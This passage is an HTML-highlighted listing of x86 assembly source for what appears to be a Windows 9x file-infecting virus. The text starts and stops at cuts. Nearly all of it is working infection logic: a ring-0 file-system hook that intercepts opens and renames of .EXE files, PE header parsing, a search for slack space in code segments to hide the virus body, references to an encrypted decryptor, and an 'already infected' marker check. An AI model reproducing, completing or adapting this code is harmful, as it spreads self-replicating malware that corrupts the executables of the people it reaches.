        </span><span class="sc5">LastObjectPtr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">SlackInCodeSegment</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SlackInDataSegment</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">OldRVA</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">StackSave</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">NewVirusOffset</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">JumpTableMoveOffset</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">NewGuideOffset</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NewDecryptorOffset</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NewDataSegmentOffset</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">Unload</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZeroRegEnd</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; eax = how much free space</span><span class="sc0">
   </span><span class="sc1">; ebx = where it is located</span><span class="sc0">
   </span><span class="sc1">; ecx = pointer to segment object table</span><span class="sc0">
   </span><span class="sc1">; edx = last object pointer</span><span class="sc0">
   



   </span><span class="sc5">GetSegmentSlack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr2</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">PE_NTHdrSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; NT hdr size</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; ebx -&gt; object table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">PE_Objects</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; # objects</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; push pointer to last object</span><span class="sc0">
                                                </span><span class="sc1">; + 40</span><span class="sc0">
   </span><span class="sc5">FindCodeSegmentLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">DidntFindSegment</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; is code object?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FindCodeSegmentLoop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; pop pointer to last object</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; size of segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalOffset</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; where does segment start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CalculateFreeSpace</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr2</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">DidntFindSegment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr2</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


        </span><span class="sc5">SegmentSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SegmentOffset</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SegmentBuffer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CalculateFreeSpace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SegmentSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SegmentOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_AllocMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SegmentBuffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">SegmentOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; read from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; read to </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">SegmentSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; how much to read</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIORead</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">SegmentBuffer</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">SegmentSize</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; edi -&gt; end of segment</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; push end of seg</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">        
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; end of seg         </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">; decrease some</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push number of slack bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">SegmentBuffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_FreeMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; eax = slackbytes in codeseg</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                          </span><span class="sc1">; some safety</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; where slack starts</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">















</span><span class="sc1">; ----------------------------------------</span><span class="sc0">
</span><span class="sc1">; --------------------------- FileFunction</span><span class="sc0">
</span><span class="sc1">; ----------------------------------------</span><span class="sc0">

</span><span class="sc5">FileFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">BasePtr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">66666666h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Unload</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CallInOurFunction</span><span class="sc0">


        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Flag</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CallInOurFunction</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Flag</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CheckFilename</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CheckFilename</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

   </span><span class="sc5">CheckFilename</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">FileToInfect</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">250</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'OLNU'</span><span class="sc0">        </span><span class="sc1">; is catalog starting on unlo</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Unload</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; unload virus then</span><span class="sc0">
        

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'FNI\'          ; dont infect files in \win*
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FileFunctionEnd</span><span class="sc0">                 </span><span class="sc1">; if there is a bug we dont</span><span class="sc0">
                                                </span><span class="sc1">; to hurt system critical</span><span class="sc0">
                                                </span><span class="sc1">; files</span><span class="sc0">



        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FileFunctionEnd</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; where to read in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOReadDWordToSlack</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FileFunctionEnd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                         </span><span class="sc1">; where to read in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOReadDWordToSlack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Slack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PEHeadOfs</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOReadDWordToSlack</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadOfs</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">84</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOReadDWordToSlack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Slack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; size of exehead, pehead and</span><span class="sc0">
                                                </span><span class="sc1">; objtable</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadOfs</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; size of pehead and objtable</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">HeaderSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; allocate mem for PEHeader</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_AllocMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">HeaderSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadOfs</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIORead</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'y3k?'</span><span class="sc0">                      </span><span class="sc1">; already infected</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
